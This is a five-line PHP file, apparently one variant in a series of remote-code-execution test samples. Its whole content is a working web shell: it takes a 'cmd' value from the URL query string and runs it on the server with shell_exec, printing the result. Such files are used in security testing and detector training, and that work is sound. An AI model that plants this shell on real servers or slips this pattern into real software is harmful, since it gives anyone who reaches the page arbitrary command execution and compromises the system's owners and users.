<?php
// RCE test variation #68
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>